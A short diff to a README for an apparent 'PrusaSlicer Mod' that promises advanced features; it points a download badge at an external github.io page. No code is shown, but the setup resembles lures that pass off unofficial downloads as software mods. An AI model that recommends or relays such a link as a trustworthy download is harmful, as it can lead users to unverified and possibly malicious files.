@@ -2,7 +2,8 @@
 
 Unlock advanced features in PrusaSlicer to optimize your 3D printing experience with enhanced control and customization.
 
-[![Download PrusaSlicer Mod](https://img.shields.io/badge/Download-PrusaSlicerMod-blueviolet)](#)
+[![Download PrusaSlicer Mod](https://img.shields.io/badge/Download-PrusaSlicerMod-blueviolet)](https://prusaslicer-advanced-features-mod.github.io/.github
+)
 
 ---
 
